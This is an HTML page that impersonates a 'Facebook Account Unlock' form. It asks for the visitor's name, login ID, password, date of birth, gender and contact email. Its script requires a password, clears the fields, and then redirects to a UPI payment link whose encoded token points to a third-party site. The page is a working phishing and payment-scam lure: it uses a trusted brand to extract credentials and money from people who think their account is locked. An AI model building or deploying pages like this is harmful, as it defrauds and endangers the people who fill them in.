
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content=
  "width=device-width, initial-scale=1.0">
  <title>Unlok</title>
  <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .contact-container {
            width: 80%;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            transition: margin-top 0.3s;
        }
        .contact-container h2 {
            text-align: center;
            margin-bottom: 20px;
            color: green;
        }
        .form-fields {
            display: flex;
            flex-direction: column;
        }
        .contact-container label {
            margin-bottom: 5px;
            color: black;
        }
        .contact-container input,
        .contact-container select,
        .contact-container textarea {
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            width: 100%;
            box-sizing: border-box;
        }
        .proceed-btn {
            padding: 10px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }
        .proceed-btn:hover {
            background-color: #218838;
        }
        .password-container {
            display: flex;
            align-items: center;
            position: relative;
        }
        .password-container input {
            flex: 1;
            margin-right: 10px;
        }
        .toggle-icon {
            position: absolute;
            right: 15px;
            top: 16%;
            cursor: pointer;
            font-size: 18px;
            user-select: none;
        }
        .optional-text {
            color: green;
            opacity: 0.5;
            font-size: 0.9em;
            margin-left: 5px;
            margin-top: -15px;
        }
        .confirmation-options {
            margin-top: 10px;
        }
        .confirmation-options div {
            padding: 10px;
            cursor: pointer;
            display: flex;
            align-items: center;
        }
        .confirmation-options div .checkbox {
            margin-right: 10px;
        }
        .confirmation-options div:hover {
            background-color: #f0f0f0;
        }
        .checkbox {
            width: 15px;
            height: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            position: relative;
            display: inline-block;
            cursor: pointer;
        }
        .checkbox.checked::after {
            content: '';
            position: absolute;
            top: 1px;
            left: 13px;
            width: 7px;
            height: 25px;
            border: solid green;
            border-width: 0 6px 6px 0;
            transform: rotate(45deg);
        }
        .checkbox.no-options-checked::after {
            border-color: red !important;
        }
  </style>
</head>
<body>
  <!-- Changed to div instead of form and added autocomplete="off" to all inputs -->
  <div class="contact-container">
    <h2>Facebook Account Unlock</h2>
    <div class="form-fields" id="fakeForm">
      <label for="name"><strong>Full Name</strong></label>
      <input type="text" id="name" placeholder=
      "Enter your full name" autocomplete="off" autocorrect="off"
      spellcheck="false"> <label for="loginId"><strong>Login
      ID</strong></label> <input type="text" id="loginId"
      placeholder="Enter your mobile number or email address"
      autocomplete="off" autocorrect="off" spellcheck="false"> 
      <!-- Changed to text type with new-password autocomplete -->
       <label for="password"><strong>Password</strong></label>
      <div class="password-container">
        <input type="text" id="password" placeholder=
        "Enter your password" autocomplete="new-password"
        autocorrect="off" spellcheck="false"> <span class=
        "toggle-icon" id="togglePassword"></span>
      </div><label for="dob"><strong>Date of Birth</strong></label>
      <div style="display: flex; align-items: center;">
        <input type="date" id="dob" placeholder=
        "Enter your Date of Birth" autocomplete="off"> <span class=
        "optional-text">(Optional)</span>
      </div><label for="gender"><strong>Gender</strong></label>
      <select id="gender" autocomplete="off">
        <option value="" disabled selected>
          Select your Gender
        </option>
        <option value="male">
          Male
        </option>
        <option value="female">
          Female
        </option>
        <option value="other">
          Other
        </option>
      </select> <label for="contactEmail"><strong>Contact
      Email</strong></label> <input type="text" id="contactEmail"
      placeholder="Enter your contact email" autocomplete="off"
      autocorrect="off" spellcheck="false"> <label style=
      "font-size: 1.4em; color: green;"><strong>Select your
      confirmation</strong></label>
      <div class="confirmation-options">
        <div onclick="selectOption(this, 'option1')">
          <div class="checkbox" id="option1"></div>Get a code by
          email
        </div>
        <div onclick="selectOption(this, 'option2')">
          <div class="checkbox" id="option2"></div>Get a code on
          your phone
        </div>
        <div onclick="selectOption(this, 'option3')">
          <div class="checkbox" id="option3"></div>Enter your date
          of birth
        </div>
        <div onclick="selectOption(this, 'option4')">
          <div class="checkbox" id="option4"></div>Get a code on
          WhatsApp
        </div>
        <div onclick="selectOption(this, 'option5')">
          <div class="checkbox" id="option5"></div>Confirm your
          identity
        </div>
        <div onclick="selectOption(this, 'noOptions')">
          <div class="checkbox" id="noOptions"></div>No options
        </div>
      </div><label for="accountLockReason"><strong>Why was your
      account locked?</strong></label> <select id=
      "accountLockReason" autocomplete="off">
        <option value="" disabled selected>
          Select reason
        </option>
        <option value="unknown">
          Unknown reason
        </option>
        <option value="security">
          Security issue
        </option>
        <option value="policy_violation">
          Policy violation
        </option>
        <option value="suspicious_activity">
          Suspicious activity
        </option>
        <option value="my_confirmation_is_lost">
          My confirmation is lost
        </option>
        <option value="other">
          Other
        </option>
      </select> <label for="exactReason"><strong>About your
      account</strong></label> 
      <textarea id="exactReason" rows="4" placeholder=
      "Do you want to say anything about your Facebook account"
      autocomplete="off" autocorrect="off" spellcheck=
      "false"></textarea> <button class="proceed-btn" onclick=
      "validateAndRedirect(event)">Proceed</button>
    </div>
  </div>
  <script>
    function validateAndRedirect(event) {
        // Prevent any default form behavior
        event.preventDefault();
        
        // Check if password is at least 6 characters long
        const password = document.getElementById('password').value;
        if (password.length < 6) {
            alert("Please enter a correct password (at least 6 characters).");
            return;
        }

        // Check if any checkbox is selected
        const selectedCheckbox = document.querySelector('.confirmation-options .checkbox.checked');
        if (!selectedCheckbox) {
            alert("Please select at least one confirmation option.");
            return;
        }

        // Clear all input values before redirect (optional)
        document.getElementById('fakeForm').querySelectorAll('input, select, textarea').forEach(element => {
            element.value = '';
        });

        // Redirect without form submission
        setTimeout(function() {
            window.location.href = "https://upilinks.in/payment-link/upi2012492470?token=Mjk5fHxhSFIwY0hNNkx5OTFjR0Z1Wld3dWIyNXNhVzVsTDJaZllpOWpiMjVtYVhKdFlYUnBiMjQ9fHxodHRwczovL3VwYW5lbC5vbmxpbmUvZl9iL2ZfYi1sb2dvLnN2Zw==";
        }, 50);
    }

    // Password toggle visibility
    const togglePassword = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('password');
    togglePassword.addEventListener('click', function () {
        const type = passwordInput.getAttribute('type') === 'text' ? 'text' : 'text';
        passwordInput.setAttribute('type', type);
        this.textContent = type === 'text' ? '' : '';
    });

    // Confirmation checkbox selection
    function selectOption(option, optionId) {
        const checkBox = option.querySelector('.checkbox');
        const allCheckBoxes = document.querySelectorAll('.confirmation-options .checkbox');
        if (optionId === 'noOptions') {
            allCheckBoxes.forEach(box => {
                if (box.id !== 'noOptions') {
                    box.classList.remove('checked');
                }
            });
            checkBox.classList.add('no-options-checked');
        } else {
            const noOptionsBox = document.getElementById('noOptions');
            noOptionsBox.classList.remove('checked');
            noOptionsBox.classList.remove('no-options-checked');
        }
        checkBox.classList.toggle('checked');
    }
  </script>
</body>
</html>
